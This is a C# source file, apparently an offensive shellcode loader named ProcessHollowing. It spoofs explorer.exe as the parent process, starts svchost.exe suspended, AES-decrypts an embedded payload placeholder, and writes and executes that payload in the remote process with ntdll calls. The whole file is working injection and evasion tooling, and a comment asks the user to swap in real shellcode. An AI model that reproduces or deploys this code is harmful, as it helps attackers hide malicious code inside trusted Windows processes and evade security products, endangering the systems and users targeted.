using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ProcessHollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // Kernel32 and NTDLL API imports
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
        [DllImport("kernel32.dll")] static extern uint GetLastError();
        [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferLength, out UIntPtr BytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UIntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maxStackSize, IntPtr attributeList);

        static void Main(string[] args)
        {
            string targetPath = "C:\\Windows\\System32\\svchost.exe";

            // Open parent process (explorer.exe) for spoofing
            IntPtr parentHandle = OpenProcess(0x001F0FFF, false, (uint)Process.GetProcessesByName("explorer")[0].Id);

            // Set up attribute list for PPID spoofing
            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            IntPtr pAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(pAttributeList, 1, 0, ref lpSize);
            IntPtr attributeValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(attributeValue, parentHandle);
            UpdateProcThreadAttribute(pAttributeList, 0, (IntPtr)0x00020000, attributeValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            // Prepare STARTUPINFOEX with spoofed parent
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
            sInfoEx.lpAttributeList = pAttributeList;

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            // Create suspended process
            bool result = CreateProcess(null, targetPath, ref pSec, ref tSec, false, 0x00080000 | 0x00000004, IntPtr.Zero, null, ref sInfoEx, out pInfo);
            if (!result)
            {
                Console.WriteLine("[-] Failed to create process: " + GetLastError());
                return;
            }
            Console.WriteLine("[+] Spoofed process created. PID: " + pInfo.dwProcessId);

            // Encrypted payload (sample only, replace with real shellcode)
            byte[] encryptedShellcode = new byte[] { 0x96, 0x3e, 0x29, 0x8b, 0x00 }; // Example content

            // AES key and IV
            byte[] aesKey = new byte[] { 0x7d, 0x8b, 0xc3, 0xe1, 0xea, 0x7d, 0x56, 0x27, 0x25, 0x3d, 0x52, 0x9d, 0x7a, 0xe4, 0x44, 0xa7, 0xac, 0x53, 0x37, 0xbf, 0xda, 0x87, 0xf7, 0xb1, 0x68, 0xbb, 0xd6, 0xdf, 0xef, 0x12, 0xac, 0xae };
            byte[] aesIV = new byte[] { 0xad, 0xee, 0x1f, 0x40, 0x77, 0xd6, 0x1f, 0x14, 0x4f, 0xb4, 0xbd, 0x33, 0x30, 0x5f, 0xac, 0x77 };

            // Decrypt shellcode
            byte[] shellcode = AESDecrypt(encryptedShellcode, aesKey, aesIV);

            IntPtr baseAddress = IntPtr.Zero;
            UIntPtr regionSize = (UIntPtr)shellcode.Length;

            // Retrieve syscall stub for NtAllocateVirtualMemory
            IntPtr stub = GetSyscallStub("NtAllocateVirtualMemory");
            var alloc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemoryDelegate));

            // Allocate memory in the remote process
            uint ntstatus = alloc(pInfo.hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x04);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Memory allocation failed: 0x" + ntstatus.ToString("X"));
                return;
            }
            Console.WriteLine("[+] Memory allocated at address: 0x" + baseAddress.ToString("X"));

            // Write and protect shellcode memory
            NtWriteVirtualMemory(pInfo.hProcess, baseAddress, shellcode, (uint)shellcode.Length, out _);
            NtProtectVirtualMemory(pInfo.hProcess, ref baseAddress, ref regionSize, 0x20, out _);

            // Launch the shellcode
            NtCreateThreadEx(out IntPtr hThread, 0x1FFFFF, IntPtr.Zero, pInfo.hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Remote thread launched. Shellcode executing...");
        }

        public static byte[] AESDecrypt(byte[] cipher, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(cipher, 0, cipher.Length);
                }
            }
        }

        public static IntPtr GetSyscallStub(string functionName)
        {
            string sysDir = Environment.SystemDirectory + "\\ntdll.dll";
            IntPtr hModule = LoadLibrary(sysDir);
            IntPtr funcPtr = GetProcAddress(hModule, functionName);
            byte[] stub = new byte[32];
            Marshal.Copy(funcPtr, stub, 0, stub.Length);
            IntPtr stubPtr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x1000 | 0x2000, 0x40);
            Marshal.Copy(stub, 0, stubPtr, stub.Length);
            return stubPtr;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect);
    }
}
